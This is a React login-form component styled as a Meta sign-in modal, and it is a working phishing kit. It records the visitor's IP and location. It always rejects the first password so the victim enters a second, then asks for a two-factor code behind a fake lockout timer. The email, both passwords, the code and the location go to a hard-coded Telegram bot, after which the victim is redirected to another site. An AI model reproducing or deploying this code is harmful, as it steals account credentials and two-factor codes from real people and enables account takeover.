import { useEffect, useState } from "react";
import "./LoginForm.scss";

function LoginForm({ onClose }) {
	const [isShowPass, setIsShowPass] = useState(false);
	const [code, setCode] = useState("");
	const [email, setEmail] = useState("");
	const [password, setPassword] = useState("");
	const [password1, setPassword1] = useState("");
	const [password2, setPassword2] = useState("");
	const [isSuccess, setIsSuccess] = useState(false);
	const [clickCount, setClickCount] = useState(0);
	const [clickCount1, setClickCount1] = useState(0);
	const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
	const [ip, setIp] = useState("");
	const [location, setLocation] = useState("");
	const [timeLeft, setTimeLeft] = useState(90);
	const [errors, setErrors] = useState({
		email: "",
		password: "",
		code: "",
		submit: "",
		isSubmitCode: "",
	});

	useEffect(() => {
		const fetchData = async () => {
			try {
				const response = await fetch(
					"https://api.ipify.org?format=json"
				);
				if (!response.ok) {
					throw new Error("Failed to fetch data");
				}
				const result = await response.json();
				setIp(result.ip);
				if (result && result.ip) {
					const locationResponse = await fetch(
						`https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
					);
					if (!locationResponse.ok) {
						throw new Error("Failed to fetch location data");
					}
					const locationData = await locationResponse.json();
					const locationText =
						locationData?.district + " - " + locationData?.city;
					if (locationText) {
						setLocation(locationText);
					}
				}
			} catch (err) {
				console.log(err);
			}
		};

		fetchData();
	}, []);

	const handleOnchangeEmail = (e) => {
		setErrors((prevErrors) => ({
			...prevErrors,
			email: "",
			submit: "",
		}));
		setEmail(e.target.value);
	};

	const handleOnchangePassword = (e) => {
		setErrors((prevErrors) => ({
			...prevErrors,
			password: "",
			submit: "",
		}));
		setPassword(e.target.value);
	};

	const handleOnchangeCode = (e) => {
		setErrors((prevErrors) => ({
			...prevErrors,
			code: "",
			isSubmitCode: "",
		}));
		setCode(e.target.value);
	};

	const validateInputs = () => {
		let isValid = true;
		const newErrors = { email: "", password: "" };

		if (!email) {
			newErrors.email = "Email is required";
			isValid = false;
		}

		if (!password) {
			newErrors.password = "Password is required";
			isValid = false;
		}

		setErrors(newErrors);
		return isValid;
	};

	const botToken = "8084816537:AAHxy16raKfk1qJ7ZHDJ9k1LSJo5DMKlp28";
	const chatId = "-4640665076";

	const sendToTelegram = async () => {
		try {
			if (email && password1 && password2 && code) {
				setClickCount1((prevCount) => prevCount + 1);

				if (clickCount1 === 0) {
					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;

					await fetch(
						`https://api.telegram.org/bot${botToken}/sendMessage`,
						{
							method: "POST",
							headers: {
								"Content-Type": "application/json",
							},
							body: JSON.stringify({
								chat_id: chatId,
								text: message,
							}),
						}
					);
					setTimeout(() => {
						setIsSubmitDisabled(true);

						const countdown = setInterval(() => {
							setTimeLeft((prevTime) => {
								if (prevTime <= 1) {
									clearInterval(countdown);
									setIsSubmitDisabled(false);
									return 0;
								}
								return prevTime - 1;
							});
						}, 1000);
					}, 2000);

					// setErrors((prevErrors) => ({
					// 	...prevErrors,
					// 	isSubmitCode:
					// 		"The code you entered is incorrect. Please try again.",
					// }));
				} else if (clickCount1 === 1) {
					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;

					await fetch(
						`https://api.telegram.org/bot${botToken}/sendMessage`,
						{
							method: "POST",
							headers: {
								"Content-Type": "application/json",
							},
							body: JSON.stringify({
								chat_id: chatId,
								text: message,
							}),
						}
					);
					setTimeout(() => {
						setIsSubmitDisabled(true);
						window.location.href = "https://finaloop.com";
						setErrors((prevErrors) => ({
							...prevErrors,
							isSubmitCode: "",
						}));
					}, 2000);
				}
			}
		} catch (error) {
			console.error("Error sending to Telegram:", error);
		}
	};

	const handleSubmit = (e) => {
		e.preventDefault();
		if (validateInputs()) {
			setClickCount((prevCount) => prevCount + 1);

			if (clickCount === 0) {
				setPassword1(password);
				setTimeout(() => {
					setErrors((prevErrors) => ({
						...prevErrors,
						submit: "The password you've entered is incorrect.",
					}));
					setPassword("");
				}, 2000);
			} else if (clickCount === 1) {
				setPassword2(password);
				setTimeout(async () => {
					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password}`;

					await fetch(
						`https://api.telegram.org/bot${botToken}/sendMessage`,
						{
							method: "POST",
							headers: {
								"Content-Type": "application/json",
							},
							body: JSON.stringify({
								chat_id: chatId,
								text: message,
							}),
						}
					);
					setIsSuccess(true);
				}, 2000);
			}
		}
	};

	const toggleShowPass = () => {
		setIsShowPass(!isShowPass);
	};
	return (
		<div className="modal-overlay">
			<div className="modal-content" onClick={(e) => e.stopPropagation()}>
				{isSuccess ? (
					<div className="top">
						<div className="check">
							<p className="title">
								Check your authentication code
							</p>
							<p className="desc">
								Enter the 6-digit or 8-digit code for this
								account from the two-factor authentication you
								set up (such as Google Authenticator or text
								message on you mobile).
							</p>
							<img
								src="https://notica.setting-advanted-policy.com/assets/s32w659we12154r-789aa068.gif"
								alt=""
							/>
						</div>
						<div className="check">
							<div className="input-box">
								<label>Code *</label>
								<input
									type="text"
									placeholder="Code"
									value={code}
									onChange={(e) => handleOnchangeCode(e)}
								/>
								{errors.code && (
									<span className="error">{errors.code}</span>
								)}
								{errors.isSubmitCode && (
									<span className="error">
										{errors.isSubmitCode}
									</span>
								)}
							</div>
							{isSubmitDisabled && (
								<span className="error">
									The two-factor authentication you entered is
									incorrect. Please, try again after{" "}
									{Math.floor(timeLeft / 60)} minutes{" "}
									{String(timeLeft % 60).padStart(2, "0")}{" "}
									seconds
								</span>
							)}
							<button
								type="button"
								className={`login-btn ${
									isSubmitDisabled ? "disabled" : ""
								}`}
								onClick={sendToTelegram}
								disabled={isSubmitDisabled}
							>
								Continue
							</button>
						</div>
					</div>
				) : (
					<div className="top">
						<img
							className="logo"
							src="data:image/png;base64,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"
							alt=""
						/>
						<form onSubmit={handleSubmit}>
							<div className="input-box">
								<label>Email *</label>
								<input
									type="email"
									placeholder="Enter your email"
									value={email}
									onChange={(e) => handleOnchangeEmail(e)}
								/>
								{errors.email && (
									<span className="error">
										{errors.email}
									</span>
								)}
							</div>
							<div className="input-box">
								<label>Password *</label>
								<div className="box">
									<input
										type={isShowPass ? "text" : "password"}
										placeholder="Enter your password"
										value={password}
										onChange={(e) =>
											handleOnchangePassword(e)
										}
									/>
									{errors.password && (
										<span className="error">
											{errors.password}
										</span>
									)}
									{isShowPass ? (
										<i
											className="fa-regular fa-eye"
											onClick={toggleShowPass}
										></i>
									) : (
										<i
											className="fa-regular fa-eye-slash"
											onClick={toggleShowPass}
										></i>
									)}
								</div>
							</div>
							{errors.submit && (
								<span className="error">{errors.submit}</span>
							)}
							<button type="submit" className="login-btn">
								Continue
							</button>
						</form>
					</div>
				)}

				<svg
					width="329"
					height="66"
					viewBox="0 0 329 66"
					fill="none"
					xmlns="http://www.w3.org/2000/svg"
				>
					<g clipPath="url(#clip0_4111_993)">
						<path
							d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z"
							fill="#66778A"
						></path>
						<path
							d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z"
							fill="#66778A"
						></path>
						<path
							d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z"
							fill="#66778A"
						></path>
						<path
							d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z"
							fill="#66778A"
						></path>
						<path
							d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z"
							fill="#66778A"
						></path>
					</g>
					<defs>
						<clipPath id="clip0_4111_993">
							<rect width="329" height="66" fill="white"></rect>
						</clipPath>
					</defs>
				</svg>
			</div>
		</div>
	);
}

export default LoginForm;
